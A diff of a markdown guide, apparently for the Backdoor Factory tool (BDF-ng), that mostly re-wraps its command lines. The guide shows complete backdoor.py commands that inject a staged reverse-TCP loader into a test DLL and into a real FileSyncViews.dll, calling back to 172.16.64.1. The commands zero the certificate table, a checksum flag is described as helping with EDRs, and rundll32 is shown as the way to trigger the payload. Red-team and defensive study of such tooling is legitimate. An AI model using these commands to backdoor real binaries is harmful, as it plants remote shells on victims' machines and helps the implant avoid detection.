@@ -27,9 +27,11 @@ I created a simple DLL with two exports for messagebox popups.
 Here's BDF targeting both DLL exports.
 
 ```bash
-./backdoor.py -f tests/hello-world.dll PATCH_METHOD=hook_dll_exports MODE=dll_loader_single_cave \
-PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded HOST=172.16.64.1 PORT=8080 \
-EXPORTS=MessageBoxThread1,MessageBoxThread2, CHECKSUM=True ZERO_CERT=True
+./backdoor.py -f tests/hello-world.dll PATCH_METHOD=hook_dll_exports \ 
+MODE=dll_loader_single_cave PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded \
+HOST=172.16.64.1 PORT=8080 \
+EXPORTS=MessageBoxThread1,MessageBoxThread2, CHECKSUM=True \
+ZERO_CERT=True
 ^(;,;)^ - oh hai
          Author:    Joshua Pitts
          Email:     the.midnite.runr[-at ]gmail<d o-t>com
@@ -79,7 +81,7 @@ EXPORTS=MessageBoxThread1,MessageBoxThread2, CHECKSUM=True ZERO_CERT=True
 
 To execute this DLL you would use rundll32.exe as so: `rundll32.exe hello-world.dll,MessageBoxThread1`. 
 
-```bash
+
 
 Now to explain each part of the command:
 PATCH_METHOD - This is the method to use to patch the file. In this case, we're using hook_dll_exports.
@@ -90,7 +92,7 @@ PORT - This is the port to connect back to.
 EXPORTS - These are the exports to hook. In this case, we're hooking both MessageBoxThread1 and MessageBoxThread2. You can all use `all` to hook all exports, not recommended generally for large DLLs, best to manually test each export.
 CHECKSUM - This is a flag to update the PE file checksum. This is useful for some EDRs that check the PE file checksum.
 ZERO_CERT - This is a flag to zero out the certificate table. As the certificate will not be valid, let's remove it. Also, BDF supports code signing, if you bring your own signing certificate.
-```
+
 
 ### Real World Example
 
@@ -160,7 +162,11 @@ After some testing I found that the FileSyncViews.dll with the `StartQtApp@QtVie
 
 ```bash
 
- ./backdoor.py -q -f tests/FileSyncViews.dll PATCH_METHOD=hook_dll_exports MODE=dll_loader_single_cave PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded HOST=172.16.64.1 PORT=9090 EXPORTS='?StartQtApp@QtViews@@YAXAEAHPEAVIResourceProvider@@PEAVICrossPlatformWindowManager@@@Z' TESTING=True CHECKSUM=True ZERO_CERT=True  -M manual
+ ./backdoor.py -q -f tests/FileSyncViews.dll PATCH_METHOD=hook_dll_exports \
+ MODE=dll_loader_single_cave PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded \
+ HOST=172.16.64.1 PORT=9090 \
+ EXPORTS='?StartQtApp@QtViews@@YAXAEAHPEAVIResourceProvider@@PEAVICrossPlatformWindowManager@@@Z' \
+ TESTING=True CHECKSUM=True ZERO_CERT=True  -M manual
          BDF-ng
          
          Author:    Joshua Pitts
